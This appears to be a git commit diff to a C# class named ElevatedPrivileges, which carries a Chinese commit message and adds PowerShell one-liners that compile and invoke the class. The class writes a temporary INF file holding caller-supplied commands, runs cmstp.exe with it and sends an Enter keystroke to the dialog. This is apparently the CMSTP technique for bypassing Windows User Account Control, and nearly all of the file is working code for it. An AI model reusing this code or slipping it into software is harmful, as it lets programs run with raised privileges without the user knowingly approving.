e9b156d87473306c4c8d5f7b7408b8da5f9a7349
Ellyn Riraille <nifx28@gmail.com>
2019-02-10 17:13:10 +0800

    使用 PowerShell 編譯、載入組件。

--- ScheduledTask/ElevatedPrivileges.cs
+++ ScheduledTask/ElevatedPrivileges.cs
@@ -3,31 +3,34 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using static System.Environment;
 
-namespace ScheduledTask
+/// <summary>
+/// Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\ElevatedPrivileges.cs")) -OutputAssembly "ElevatedPrivileges.dll"
+/// [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\ElevatedPrivileges.dll"))
+/// If (([Management.Automation.PSTypeName]'ElevatedPrivileges').Type) { [ElevatedPrivileges]::Invoke("C:\ScheduledTask\ScheduledTask.exe") }
+/// </summary>
+public class ElevatedPrivileges
 {
-    class ElevatedPrivileges
+    public enum CmdShow { SW_SHOW = 5 }
+    public enum Message { WM_KEYDOWN = 0x0100 }
+    public enum KeyCodes { VK_RETURN = 0x0D }
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, CmdShow cmdShow);
+    [DllImport("user32.dll")]
+    public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")]
+    public static extern int SendMessage(IntPtr hWnd, Message msg, KeyCodes wParam, int lParam = 0);
+
+    public static string BuildServiceProfile(string cmdsHere)
     {
-        public enum CmdShow { SW_SHOW = 5 }
-        public enum Message { WM_KEYDOWN = 0x0100 }
-        public enum KeyCodes { VK_RETURN = 0x0D }
+        var infFile = Path.GetRandomFileName().Split(new char[] { '.' })[0] + ".inf";
+        var path = Path.Combine(Path.GetTempPath(), infFile);
 
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, CmdShow cmdShow);
-        [DllImport("user32.dll")]
-        public static extern bool SetForegroundWindow(IntPtr hWnd);
-        [DllImport("user32.dll")]
-        public static extern int SendMessage(IntPtr hWnd, Message msg, KeyCodes wParam, int lParam = 0);
-
-        public static string BuildServiceProfile(string cmdsHere)
+        using (Stream stream = File.OpenWrite(path))
+        using (StreamWriter writer = new StreamWriter(stream, Encoding.ASCII))
         {
-            var path = Path.GetRandomFileName().Split(new char[] { '.' })[0] + ".inf";
-
-            using (Stream stream = File.OpenWrite(Path.Combine(Program.AppDataPath, path)))
-            using (StreamWriter writer = new StreamWriter(stream, Encoding.ASCII))
-            {
-                writer.Write($@"[version]
+            writer.Write(@"[version]
 Signature=$chicago$
 AdvancedINF=2.5
 [DefaultInstall]
@@ -45,51 +48,48 @@ CommandsHere = ""{cmdsHere}""
 UnexpectedError = ""An unexpected error occurred.  Please reboot and try the installation again.""
 ServiceName=""ElevatedPrivileges""
 ShortSvcName=""ed23c88e-8b38-4afe-be0f-cde578e23259""
-");
-            }
-
-            return path;
+".Replace("{cmdsHere}", cmdsHere));
         }
 
-        public static bool Invoke(string cmdsHere)
+        return path;
+    }
+
+    public static bool Invoke(string cmdsHere)
+    {
+        var cmstp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
+
+        if (!File.Exists(cmstp))
         {
-            var cmstp = Path.Combine(GetFolderPath(SpecialFolder.System), "cmstp.exe");
-
-            if (!File.Exists(cmstp))
-            {
-                return false;
-            }
-
-            var hWnd = IntPtr.Zero;
-            var info = new ProcessStartInfo(cmstp);
-            info.Arguments = $@"/au ""{BuildServiceProfile(cmdsHere)}""";
-            info.CreateNoWindow = true;
-            info.UseShellExecute = false;
-            var proc = Process.Start(info);
-            var sw = Stopwatch.StartNew();
-
-            while (proc.MainWindowHandle == IntPtr.Zero)
-            {
-                if (proc.MainWindowHandle != IntPtr.Zero)
-                {
-                    hWnd = proc.MainWindowHandle;
-                    break;
-                }
-
-                if (sw.Elapsed > TimeSpan.FromSeconds(5))
-                {
-                    break;
-                }
-            }
-
-            if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
-            {
-                Program.Logger($"{hWnd}");
-                SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
-            }
-
-            proc.WaitForExit();
-            return (proc.ExitCode == 0);
+            return false;
         }
+
+        var hWnd = IntPtr.Zero;
+        var info = new ProcessStartInfo(cmstp);
+        info.Arguments = @"/au """ + BuildServiceProfile(cmdsHere) + @"""";
+        info.UseShellExecute = false;
+        var proc = Process.Start(info);
+        var sw = Stopwatch.StartNew();
+
+        while (proc.MainWindowHandle == IntPtr.Zero)
+        {
+            if (proc.MainWindowHandle != IntPtr.Zero)
+            {
+                hWnd = proc.MainWindowHandle;
+                break;
+            }
+
+            if (sw.Elapsed > TimeSpan.FromSeconds(5))
+            {
+                break;
+            }
+        }
+
+        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
+        {
+            SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
+        }
+
+        proc.WaitForExit();
+        return (proc.ExitCode == 0);
     }
 }
